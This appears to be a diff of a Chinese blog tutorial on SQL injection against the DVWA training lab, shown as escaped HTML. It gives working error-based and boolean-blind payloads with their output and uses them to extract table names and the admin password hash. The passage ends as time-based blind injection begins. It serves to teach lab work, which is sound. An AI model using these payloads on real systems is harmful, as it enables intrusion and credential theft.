+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FUNCTION dvwa.GTID_SUBSET does not exist
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:20px&#34;&gt;&lt;strong&gt;好啦，函数介绍就到此为止，下面我们正式开始报错注入的步骤！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h3 id=&#34;爆破数据库名称&#34;&gt;爆破数据库名称
-&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and extractvalue(1,concat(0x7e,database(),0x7e)) #
-
-1&amp;#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;出现下面报错：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~dvwa~&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这就得到了数据库的名称：dvwa&lt;/p&gt;
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,database(),0x7e)) #
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;出现下面报错：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~dvwa~&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这就得到了数据库的名称：dvwa&lt;/p&gt;
 &lt;p&gt;可能你会有疑惑，为什么要用&lt;code&gt;~&lt;/code&gt;包裹内容呢？&lt;/p&gt;
 &lt;p&gt;这一方面是方便我们看返回的结果，另一方面嘛，我们接着往下看&lt;/p&gt;
 &lt;h3 id=&#34;爆破表名&#34;&gt;爆破表名
 &lt;/h3&gt;&lt;p&gt;由于 extractvalue() 最大返回长度为 32 ，所以最好用 limit N,1 一行一行的进行回显&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 0,1),0x7e)) #
-
-1&amp;#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1),0x7e)) #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分别出现下面报错：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~guestbook~&amp;#39;
-
-XPATH syntax error: &amp;#39;~users~&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而如果不用limit语句，则会出现下面的报错：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Subquery returns more than 1 row
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;这不是我们想要的，所以limit语句很重要！&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 0,1),0x7e)) #
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1),0x7e)) #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分别出现下面报错：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~guestbook~&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~users~&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而如果不用limit语句，则会出现下面的报错：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Subquery returns more than 1 row
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这不是我们想要的，所以limit语句很重要！&lt;/strong&gt;&lt;/p&gt;
 &lt;h3 id=&#34;爆破列名&#34;&gt;爆破列名
-&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 3,1),0x7e)) #
-
-1&amp;#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 4,1),0x7e)) #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分别出现下面报错：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~user~&amp;#39;
-
-XPATH syntax error: &amp;#39;~password~&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;爆破字段内容&#34;&gt;爆破字段内容
-&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select concat_ws(&amp;#39;,&amp;#39;,user,password) from users limit 0,1),0x7e)) #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;出现下面的报错：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~admin,5f4dcc3b5aa765d61d8327deb&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里我们使用了&lt;code&gt;concat_ws&lt;/code&gt;函数，指定把&lt;code&gt;user&lt;/code&gt;和&lt;code&gt;password&lt;/code&gt;字段使用&lt;code&gt;,&lt;/code&gt;拼接再返回，这样就能实现查询多列&lt;/p&gt;
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 3,1),0x7e)) #
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 4,1),0x7e)) #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分别出现下面报错：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~user~&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~password~&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;爆破字段内容&#34;&gt;爆破字段内容
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select concat_ws(&amp;#39;,&amp;#39;,user,password) from users limit 0,1),0x7e)) #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;出现下面的报错：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~admin,5f4dcc3b5aa765d61d8327deb&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里我们使用了&lt;code&gt;concat_ws&lt;/code&gt;函数，指定把&lt;code&gt;user&lt;/code&gt;和&lt;code&gt;password&lt;/code&gt;字段使用&lt;code&gt;,&lt;/code&gt;拼接再返回，这样就能实现查询多列&lt;/p&gt;
 &lt;p&gt;如果不使用，就会出现下面的报错：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Operand should contain 1 column(s)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然而，正如上面所说，&lt;code&gt;extractvalue()&lt;/code&gt; 函数最大返回32个字符，所以现在得到的并非完整的信息，这一点我们也能从结果末尾没有&lt;code&gt;~&lt;/code&gt;看出来**（所以两边都加&lt;code&gt;~&lt;/code&gt;是比较明智的选择）**&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Operand should contain 1 column(s)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然而，正如上面所说，&lt;code&gt;extractvalue()&lt;/code&gt; 函数最大返回32个字符，所以现在得到的并非完整的信息，这一点我们也能从结果末尾没有&lt;code&gt;~&lt;/code&gt;看出来**（所以两边都加&lt;code&gt;~&lt;/code&gt;是比较明智的选择）**&lt;/p&gt;
 &lt;p&gt;所以，我们要适当舍弃一些东西，比如把admin单独拿出来，或者使用**&lt;code&gt;substring()&lt;/code&gt;函数**&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;&lt;code&gt;substring(strings,m,n)&lt;/code&gt;：从strings的第m个字符开始，向后截取n个字符。&lt;/strong&gt;
 &lt;strong&gt;&lt;mark&gt;注意&lt;/mark&gt;：1.&lt;code&gt;substring()&lt;/code&gt;的开始位置为1，和&lt;code&gt;limit&lt;/code&gt;不一样！&lt;/strong&gt;
 &lt;strong&gt;2.通常&lt;code&gt;substr()&lt;/code&gt;可以代替它，用法也相同；而&lt;code&gt;mid()&lt;/code&gt;总是可以代替它，因为就是它的别名&lt;/strong&gt;
 &lt;strong&gt;&lt;mark&gt;substr()=substring()=mid()&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&amp;#39;,&amp;#39;,user,password), 1, 30) from users limit 0,1),0x7e)) #
-
-1&amp;#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&amp;#39;,&amp;#39;,user,password), 31, 30) from users limit 0,1),0x7e)) #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分别得到下面的报错：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~admin,5f4dcc3b5aa765d61d8327de~&amp;#39;
-
-XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;拼接得到完整的用户名和密码：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin,5f4dcc3b5aa765d61d8327deb882cf99
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;利用&lt;code&gt;substring()&lt;/code&gt;，即使字段长度远远大于32，我们也能一点点凑出完整的内容&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&amp;#39;,&amp;#39;,user,password), 1, 30) from users limit 0,1),0x7e)) #
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(&amp;#39;,&amp;#39;,user,password), 31, 30) from users limit 0,1),0x7e)) #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分别得到下面的报错：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~admin,5f4dcc3b5aa765d61d8327de~&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;拼接得到完整的用户名和密码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;admin,5f4dcc3b5aa765d61d8327deb882cf99
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用&lt;code&gt;substring()&lt;/code&gt;，即使字段长度远远大于32，我们也能一点点凑出完整的内容&lt;/strong&gt;&lt;/p&gt;
 &lt;h2 id=&#34;3-盲注&#34;&gt;#3 盲注
 &lt;/h2&gt;&lt;p&gt;&lt;strong&gt;有的时候存在注入点，但是前端并不会回显注入结果，这就需要用特殊方式判断我们是否注入成功&lt;/strong&gt;&lt;/p&gt;
 &lt;h3 id=&#34;常用函数-2&#34;&gt;常用函数
@@ -1270,26 +1340,26 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/table&gt;
 &lt;h3 id=&#34;布尔盲注&#34;&gt;布尔盲注
 &lt;/h3&gt;&lt;p&gt;当我们查询的数据在数据库存在时，就会返回：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;User ID exists in the database
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反之，则会返回：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;User ID is MISSING from the database
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们可以构造一些判别式，观察页面返回值，来判断输入的语句是否为真&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User ID exists in the database
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;反之，则会返回：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User ID is MISSING from the database
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以构造一些判别式，观察页面返回值，来判断输入的语句是否为真&lt;/p&gt;
 &lt;h4 id=&#34;猜测长度&#34;&gt;猜测长度
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;使用与(and)：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and length(database())=4 #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;使用或(or)：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#39; or length(database())=4 #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面返回exists，说明数据库名称长度为4&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and length(database())=4 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;使用或(or)：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#39; or length(database())=4 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;页面返回exists，说明数据库名称长度为4&lt;/p&gt;
 &lt;p&gt;如果库名实在长，也可以使用&lt;strong&gt;二分法&lt;/strong&gt;：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and length(database())&amp;gt;4 #
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;猜测库名&#34;&gt;猜测库名
-&lt;/h4&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and substring(database(),1,1)=&amp;#39;d&amp;#39; #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果不想使用&lt;code&gt;&#39;&#39;&lt;/code&gt;包裹字母，也可以转换成ascii码：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and ascii(substr(database(),1,1))=100 #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一步步尝试，直到尝试出完整的数据库名称&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and length(database())&amp;gt;4 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;猜测库名&#34;&gt;猜测库名
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and substring(database(),1,1)=&amp;#39;d&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果不想使用&lt;code&gt;&#39;&#39;&lt;/code&gt;包裹字母，也可以转换成ascii码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and ascii(substr(database(),1,1))=100 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一步步尝试，直到尝试出完整的数据库名称&lt;/p&gt;
 &lt;p&gt;当然，我们在知道ascii码表的情况下，使用二分法更快：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and ascii(substr(database(),1,1))&amp;gt;64 #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果substring被过滤了：&lt;a class=&#34;link&#34; href=&#34;#reverse&amp;#43;left%e4%bb%a3%e6%9b%bfsubstring&#34; &gt;reverse+left代替substring
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and ascii(substr(database(),1,1))&amp;gt;64 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果substring被过滤了：&lt;a class=&#34;link&#34; href=&#34;#reverse&amp;#43;left%e4%bb%a3%e6%9b%bfsubstring&#34; &gt;reverse+left代替substring
     
 &lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;​				       &lt;a class=&#34;link&#34; href=&#34;#trim%e4%bb%a3%e6%9b%bfsubstring&#34; &gt;trim代替substring
@@ -1307,39 +1377,39 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 	
 &gt;&lt;/p&gt;
 &lt;h4 id=&#34;猜测表的数量&#34;&gt;猜测表的数量
-&lt;/h4&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (select count(table_name) from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39;)=2 #
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;猜测表2的长度&#34;&gt;猜测表2的长度
-&lt;/h4&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and length((select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1))=5#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者把length放在select后面：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (select length(table_name) from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1)=5#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:20px&#34;&gt;&lt;strong&gt;猜测表名，字段名等等的步骤都大同小异，在此不过多赘述&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (select count(table_name) from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39;)=2 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;猜测表2的长度&#34;&gt;猜测表2的长度
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and length((select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1))=5#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者把length放在select后面：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (select length(table_name) from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1)=5#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:20px&#34;&gt;&lt;strong&gt;猜测表名，字段名等等的步骤都大同小异，在此不过多赘述&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h3 id=&#34;时间盲注&#34;&gt;时间盲注
 &lt;/h3&gt;&lt;p&gt;如果页面连exists这样的返回字样都没有怎么办？&lt;/p&gt;
 &lt;p&gt;那么，我们就要寻找新的特征，来指示我们语句成功执行了——那就是时间&lt;/p&gt;
 &lt;h4 id=&#34;sleep延时&#34;&gt;sleep延时
 &lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;利用if函数和sleep函数，如果语句成功执行，就让页面延时一段时间：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
